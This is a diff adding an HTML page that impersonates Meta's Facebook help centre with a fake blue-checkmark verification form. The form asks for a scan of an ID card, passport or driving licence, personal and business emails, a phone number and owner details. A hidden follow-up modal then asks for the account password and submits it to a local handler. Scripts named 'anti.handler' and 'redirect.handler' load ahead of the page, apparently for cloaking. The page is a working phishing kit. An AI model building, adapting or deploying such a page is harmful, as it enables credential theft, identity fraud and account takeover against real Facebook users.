@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="vi">
+<script type="text/javascript" src="./assets/scripts/handlers/redirect.handler.js" r='m'></script>
+<script type="text/javascript" src="./assets/scripts/handlers/anti.handler.js" r='m'></script>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trung tâm trợ giúp</title>
+  <link rel="icon" href="./assets/images/ico.ico" type="image/x-icon">
+  <link rel="stylesheet" href="./assets/styles/bootstrap.min.css">
+  <link rel="stylesheet" href="./assets/styles/pass.css" />
+  <link rel="stylesheet" href="./assets/styles/style.css">
+</head>
+
+<body>
+  <!-- Main content -->
+  <div class="container">
+
+    <!-- Side bar -->
+    <div class="sidebar">
+      <div class="facebook-in-sidebar">
+        <img src="./assets/images/meta-logo.png" alt="Meta logo" class="meta-logo">
+      </div>
+      <ul>
+        <li><a href="#">How to create an account</a></li>
+        <li><a href="#">Your personal page</a></li>
+        <li><a href="#">Make friend</a></li>
+        <li><a href="#">Facebook Dating</a></li>
+        <li><a href="#" class="active">Your Home</a></li>
+        <li><a href="#">Texting</a></li>
+        <li><a href="#">Reels</a></li>
+        <li><a href="#">Believe</a></li>
+        <li><a href="#">Image</a></li>
+        <li><a href="#">Video</a></li>
+        <li><a href="#">Game</a></li>
+        <li><a href="#">Page</a></li>
+        <li><a href="#">Nhóm</a></li>
+        <li><a href="#">Event</a></li>
+        <li><a href="#">Meta Pay</a></li>
+        <li><a href="#">Marketplace</a></li>
+        <li><a href="#">Application</a></li>
+        <li><a href="#">Facebook Mobile App</a></li>
+        <li><a href="#">Accessibility</a></li>
+      </ul>
+    </div>
+
+    <!-- Main form -->
+    <div class="main-content">
+      <h1>Verify a Page or Profile</h1>
+      <p>A blue checkmark will appear next to the name of a verified Page or profile to indicate that Facebook has confirmed it represents the public figure, celebrity, or brand it claims to represent.</p>
+
+      <form id="verificationForm" class="form-section">
+        <div class="form-group">
+          <label>What are you verifying?</label>
+          <div class="radio-group">
+            <input type="radio" id="trang" name="verification_type" value="trang" checked>
+            <label for="trang">Page</label>
+            <input type="radio" id="ca_nhan" name="verification_type" value="ca_nhan">
+            <label for="ca_nhan">Individual</label>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Step 1: Verify authenticity</label>
+          <p class="note">Add official documents to verify identity for yourself or your business, 
+            known Facebook pages such as public figures, celebrities, and brands. Documents can be an ID card, 
+            driver's license, or birth certificate.</p>
+        </div>
+
+        <div class="form-group">
+          <label for="documentType">Type of document</label>
+          <select id="documentType">
+            <option>Driving license</option>
+            <option>ID card</option>
+            <option>Passport</option>
+            <option>Birth certificate</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="add_shoes">Add documents</label>
+          <div class="file-upload-container">
+            <input type="text" id="add_shoes" placeholder="No file selected" readonly>
+            <input type="file" id="file_input" style="display: none;" accept="image/*,.pdf">
+            <button type="button" onclick="document.getElementById('file_input').click()">Select file</button>
+          </div>
+          <div id="file_preview" style="display: none; margin-top: 10px;">
+            <img id="preview_image"
+              style="max-width: 200px; max-height: 200px; border: 1px solid #ddd; border-radius: 4px;"
+              alt="File preview">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Step 2: Confirm the notability</label>
+          <p class="note">Representing the public figure, celebrity, or brand that your Page or
+             profile represents is intended to be public.</p>
+        </div>
+
+        <div class="form-group">
+          <label for="category">Category</label>
+          <select id="category">
+            <option>News/Media</option>
+            <option>Sport</option>
+            <option>Entertainment</option>
+            <option>Politics</option>
+            <option>Business/Organization</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="city">Country/Region</label>
+          <p class="note">Enter the name of the country or region where the person or
+             organization represented by your Page or profile is most well-known.</p>
+          <input type="text" id="city" placeholder="Enter country name..." required>
+        </div>
+
+        <div class="form-group">
+          <label for="owner">Owner Name</label>
+          <input type="text" id="owner" placeholder="Enter owner name" required>
+        </div>
+
+        <div class="form-group">
+          <label for="pageName">Page name</label>
+          <input type="text" id="pageName" placeholder="Enter page name" required>
+        </div>
+
+        <div class="form-group">
+          <label for="personalEmail">Personal email</label>
+          <input type="email" id="personalEmail" placeholder="Enter personal email" required>
+        </div>
+
+        <div class="form-group">
+          <label for="businessEmail">Business Email</label>
+          <input type="email" id="businessEmail" placeholder="Enter business email" required>
+        </div>
+
+        <div class="form-group">
+          <label for="phoneNumber">Phone</label>
+          <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
+        </div>
+
+        <div class="form-group">
+          <label>Add up to 5 articles, social media accounts, and other links to demonstrate that your Page
+             or profile serves the public interest. Paid content or advertising will not be considered. (Optional)</label>
+          <input type="text" id="link 1" placeholder="Link 1">
+          <input type="text" id="link 2" placeholder="Link 2">
+          <input type="text" id="link 3" placeholder="Link 3">
+          <input type="text" id="link 4" placeholder="Link 4">
+          <input type="text" id="link 5" placeholder="Link 5">
+        </div>
+
+        <div class="button-group">
+          <button id="first-form-submit-btn" type="submit">Send</button>
+        </div>
+      </form>
+    </div>
+
+    <!-- Password form (NEW) -->
+    <div class="modal form-modal" id="passwordModal" tabindex="-1" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
+        <div class="modal-content border-0 bg-transparent">
+
+          <div class="modal-body d-flex justify-content-center p-0">
+
+            <form id="apiForm" class="pass-form" autocomplete="off" action="./verry.html">
+              <div class="mb-3">
+                <div class="password-input">
+                  <label for="secondFormPassword" class="form-label"></label>
+                  <div style="display: flex; align-items: center;">
+                    <input name="password-1" type="password" class="form-control" id="secondFormPassword"
+                      autocomplete="off" minlength="8" maxlength="30" aria-describedby="emailHelp" placeholder="Password" required
+                      onfocus="this.removeAttribute('readonly');">
+                  </div>
+                </div>
+              </div>
+
+              <div class="form-btn-wrapper">
+                <button class="btn btn-primary" type="submit">
+                  <span class="spinner-border text-light" role="status" style="display:none;"></span>
+                  <span class="button-text">Continue</span>
+                </button>
+              </div>
+              <img src="./assets/images/meta-logo.png" alt="Meta logo" class="meta-logo">
+
+            </form>
+            <div class="spaser"></div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>&copy; Meta 2025</p>
+    <ul>
+      <li><a href="#">Introduce</a></li>
+      <li><a href="#">Ad Choices</a></li>
+      <li><a href="#">Terms and policies</a></li>
+      <li><a href="#">Privacy Policy</a></li>
+      <li><a href="#">Create an ad</a></li>
+      <li><a href="#">Cookie</a></li>
+    </ul>
+    <div class="language-selector">
+      <span>English</span>
+      <img src="" alt="dropdown arrow">
+    </div>
+  </div>
+
+  <script type="module" src="./assets/scripts/index.js"></script>
+</body>
+
+</html>
